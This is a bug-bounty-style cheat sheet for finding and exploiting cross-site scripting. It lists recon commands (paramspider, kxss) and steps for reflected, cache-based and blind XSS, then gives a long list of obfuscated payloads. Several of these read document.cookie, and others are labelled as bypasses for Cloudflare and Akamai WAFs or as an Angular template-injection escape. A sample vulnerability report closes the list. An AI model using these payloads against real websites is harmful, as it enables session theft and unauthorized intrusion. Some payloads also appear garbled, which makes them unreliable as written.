- Check for search box
- Enter a random string
- Check whether it got reflected(in the body or URL)
- If reflected, then it is vulnerable to Reflected XSS
- If JS payload does not executes any XSS, try to BALANCE the code
- XSS can be achieved through changing the request method -> Adding an extra header (REFERER)
- XSS can be achieved through storing the payload in cache server ie creating a cache miss
  If data is stored = MISS
  Not Stored        = HIT
- "><svg/onload=confirm(1)>"@x.y on email address field in login page
- If our payloads fails ie giving 400 bad request, we can use '-confirm(200)-' 
  Using confirm can help in some cases other than alert
- If we do not see any search boxes, use Burp Suite spider to spider the website to find more search areas
- Blind XSS using XSS Hunter



- python3 paramspider.py --domain domian.com

- cat domain.com.txt | kxss | grep "< >" | tee unfiltered_param.txt 


- Payloads
"><img src=x onerror=alert("XSS")>
<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt${document.domain}>
<marquee+loop=1+width=0+onfinish='new+Functional\ert\1\``'>
<d3v/onauxclick=[2].some(confirm)>click
<x onauxclick=a=alert,a(domain)>click
q=1" type=image sr>c<=x one>ror<="alert> (alert')
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
(Chrome only)
?id=1&id=2
⬇️
<input value="1,2">
?id="&id=onpointerrawupdate="a=confirm&id=a(1)
⬇️
<input value="", onpointerrawupdate="a=confirm, a(1)">
Payload:
%3Cmarquee%20loop=1%20width=%271%26apos;%27onfinish=self[al+ert](1)%3E%23leet%3C/marquee%3E
FOR CHROME:
%3Cx%20y=1%20z=%271%26apos;%27onclick=self[al%2Bert](1)%3E%23CLICK%20MEE
Akamai XSS Bypass:
Cloudflare XSS Bypass: <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
</ScRiPt><img src=something onauxclick="new Function al\ert\xss\``">
"><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
link=qwe"srcdoc="\u003ce<script%26Tab;src=//dom.xss>\u003ce</script%26Tab;e>
javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle="+a+b+c+" popover id=x>Hvita</hvita>")
Angular 1.4.3 CSTI XSS Akamai WAF:
{{([].toString()).constructor.prototype.charAt=[].join;$eval(([].toString()).constructor.fromCodePoint([120],[61],[49],[125],[125],[125],[59],[97],[108],[101],[114],[116],[40],[49],[41],[47],[47]));}}

<details open ontoggle="{alert1}"></details>
Cloudflare WAF Bypass - XSS
(Still works - when only=1 didn’t)
<dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
Midnight hunting 
payload: \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
Payload: <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ==")> 
Reflected Cross-Site Scripting (XSS) and HTML Injection
## Vulnerable url :- https[:]//exampledesk[.]example[.]com/helpdesk/logon.asp?URL=%22%3E%3C/script%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
## Vulnerable Paramter :- URL=
## Payload :- "></script><script>alert(document.cookie)</script>
Yet Another Cloudflare WAF Bypass - hashtag#XSS
<a"/onclick=(confirm)(origin)>Click Here!



